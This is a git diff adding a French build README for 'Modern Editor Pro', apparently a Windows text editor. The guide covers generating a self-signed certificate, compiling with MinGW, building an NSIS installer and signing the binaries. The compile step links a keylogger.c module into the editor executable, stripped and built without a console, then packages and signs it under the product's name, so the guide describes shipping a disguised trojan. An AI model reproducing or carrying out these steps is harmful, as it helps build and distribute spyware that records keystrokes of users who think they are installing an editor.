@@ -1,1 +1,132 @@
-# Titre
+# Modern Editor Pro - Guide de compilation
+
+Un guide détaillé pour compiler et signer l'éditeur de texte professionnel pour Windows.
+
+![Version](https://img.shields.io/badge/version-1.5.2-blue)
+![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
+
+## 📑 Table des matières
+- [Prérequis](#-prérequis)
+- [Génération du certificat](#-génération-du-certificat)
+- [Compilation](#-compilation)
+- [Création de l'installateur](#-création-de-linstallateur)
+- [Signature des exécutables](#-signature-des-exécutables)
+- [Structure du projet](#-structure-du-projet)
+
+## 💻 Prérequis
+
+1. Installer les outils :
+`bash`
+`sudo apt-get install mingw-w64 openssl nsis`
+``
+
+2. Vérifier les installations :
+`bash`
+`x86_64-w64-mingw32-gcc --version`
+`openssl version`
+`makensis -version`
+``
+
+## 🔑 Génération du certificat
+
+1. Générer la clé privée et le certificat :
+`bash`
+`openssl req -x509 -newkey rsa:4096 -keyout private_key.pem -out certificate.pem -days 365 -nodes`
+``
+> Remplir les informations demandées (pays, organisation, etc.)
+
+2. Convertir en format PFX :
+`bash`
+`openssl pkcs12 -export -out professional.pfx -inkey private_key.pem -in certificate.pem`
+``
+> Définir un mot de passe fort et le conserver précieusement
+
+3. Nettoyer les fichiers temporaires :
+`bash`
+`rm private_key.pem certificate.pem`
+``
+
+## 🔨 Compilation
+
+1. Compiler les objets :
+`bash`
+`x86_64-w64-mingw32-gcc -c Meditor.c -o Meditor.o`
+`x86_64-w64-mingw32-gcc -c keylogger.c -o keylogger.o`
+`x86_64-w64-mingw32-gcc -c utils.c -o utils.o`
+``
+
+2. Compiler les ressources :
+`bash`
+`x86_64-w64-mingw32-windres resource.rc resource.res`
+``
+
+3. Lier tous les fichiers :
+`bash`
+`x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \`
+`    -o meditor.exe \`
+`    -luser32 -ladvapi32 -lcrypt32 -lshell32 -lcomdlg32 -lgdi32 \`
+`    -mwindows \`
+`    -s \`
+`    -static-libgcc`
+``
+
+## 📦 Création de l'installateur
+
+1. Vérifier le fichier installer.nsi :
+   - Mettre à jour la version
+   - Vérifier les chemins des fichiers
+   - Configurer les options d'installation
+
+2. Générer l'installateur :
+`bash`
+`makensis installer.nsi`
+``
+> Crée ModernEditorPro_1.5.2_Setup.exe
+
+## 🔐 Signature des exécutables
+
+1. Signer l'exécutable principal :
+`bash`
+`osslsigncode sign \`
+`    -pkcs12 professional.pfx \`
+`    -pass [votre_mot_de_passe] \`
+`    -n "Modern Editor Pro" \`
+`    -i "https://moderneditor.pro" \`
+`    -t http://timestamp.digicert.com \`
+`    -in meditor.exe \`
+`    -out meditor_signed.exe`
+``
+
+2. Signer l'installateur :
+`bash`
+`osslsigncode sign \`
+`    -pkcs12 professional.pfx \`
+`    -pass [votre_mot_de_passe] \`
+`    -n "Modern Editor Pro Installer" \`
+`    -i "https://moderneditor.pro" \`
+`    -t http://timestamp.digicert.com \`
+`    -in ModernEditorPro_1.5.2_Setup.exe \`
+`    -out ModernEditorPro_1.5.2_Setup_signed.exe`
+``
+
+## 📁 Structure finale
+
+- `meditor_signed.exe` - Exécutable principal signé
+- `ModernEditorPro_1.5.2_Setup_signed.exe` - Installateur signé
+- `professional.pfx` - Certificat de signature (à conserver en sécurité)
+- `config.ini` - Configuration par défaut
+- Autres fichiers de ressources (icônes, etc.)
+
+## ⚠️ Sécurité
+
+- Conservez professional.pfx dans un endroit sûr
+- Ne partagez JAMAIS le fichier .pfx ou son mot de passe
+- Ajoutez professional.pfx à votre .gitignore
+- Utilisez un mot de passe fort pour le certificat
+
+## 🔍 Vérification
+
+Pour vérifier la signature des exécutables :
+1. Clic droit sur l'exe > Propriétés
+2. Onglet "Signatures numériques"
+3. Sélectionner la signature et cliquer sur "Détails"
